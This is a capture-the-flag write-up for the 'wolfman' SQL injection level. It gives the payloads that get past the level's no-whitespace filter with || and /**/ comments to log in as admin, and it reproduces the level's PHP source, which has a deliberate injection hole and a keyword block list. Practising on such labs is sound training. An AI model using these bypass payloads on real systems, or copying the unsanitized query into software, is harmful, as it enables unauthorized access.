# Lvl Wolfman

### **Vulnerability**

Space-filtered injection

### **Way to do it**

Use || instead of OR without spaces

- Must return id='admin'

### **Restrictions**

- No whitespace allowed

### **Bypass Methods**

```
?pw=%27%7C%7C%271%27%3D%271%27%23
pw=''||'1'='1'#'
```

### **Important Notes**

> I can’t use space or leave a blank so i need to give a payload without spaces hence i used logical or operator instead of normal OR in the sqli payload  and gave %23 for # which is used for commenting out the single line statements .
> 

### **Admin Bypass**

```
?pw='||id='admin
or 
?pw=%27/**/OR/**/id=%27admin
```

> "In this payload we cant use '+' instead space and solve in this level because it is still considered as a space character by the query parameter if it contains space one's it's decoded it will be rejected by the WAF (Web Application Firewall) or the filters.”
> 

### **Level Code**

```
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("wolfman");
  highlight_file(__FILE__);
?>
```